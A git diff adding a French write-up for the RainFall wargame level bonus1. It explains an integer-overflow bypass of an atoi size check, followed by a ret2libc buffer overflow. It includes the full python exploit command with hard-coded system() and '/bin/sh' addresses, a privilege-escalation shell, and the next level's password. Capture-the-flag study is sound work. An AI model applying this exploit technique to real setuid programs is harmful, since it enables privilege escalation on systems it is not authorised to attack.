@@ -1,4 +1,43 @@
- bonus0@RainFall:~$ readelf -a bonus0 | grep "STACK"
-  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 
-0xbfffe670
+
+bonus1 prend deux arguments.
+Le premier est une string qui passe dans atoi.
+Si le retour d'atoi est superieur a 9 alors le programme s'arrete.
+Dans l'assembleur on remarque que le retour d'atoi est multiplie par 4 :
+
+   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
+
+et il est utilise dans le memcpy comme 3eme argument.
+Pour le passer on envoie donc un nombre inferieur a 9, qui mutiplie
+par 4 permettra l'overflow de l'unsigned.
+
+- (UINT_MAX / 4) = - (4294967295 / 4) = -1073741823
+
+Pour l'overflow on prend un peu plus grand : -1073741803
+
+Le second argument est aussi une chaine, qui est utilisee par memcpy
+comme chaine source.
+L'exploit se passe donc dans le memcpy.
+L'exploit se nomme "ret2libc".
+Pour continuer on doit utiliser un overflow et trouver l'offset pour
+controler le registre EIP.
+
+Avec un pattern generator on deduit que l'offset est de 56.
+A partir de la on controle EIP, on peut donc utiliser la string
+"/bin/sh" qui est stockee a :  0x8048583
+
+On va l'utiliser comme argument a la fonction system :
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+Pour cela on envoie :
+
+./bonus1 [arg1] [PADDING + ADDRESS SYSTEM + 4 BYTES + ADDRESS /bin/sh]
+
+Les 4 bytes entre les deux addresses servent passer l'addresse de retour de EIP.
+
+./bonus1 "-1073741803" $(python -c 'print "A" * 56 + "\x60\xb0\xe6\xb7" + "OUAI" + "\x83\x85\x04\x08"')
+$ id
+uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
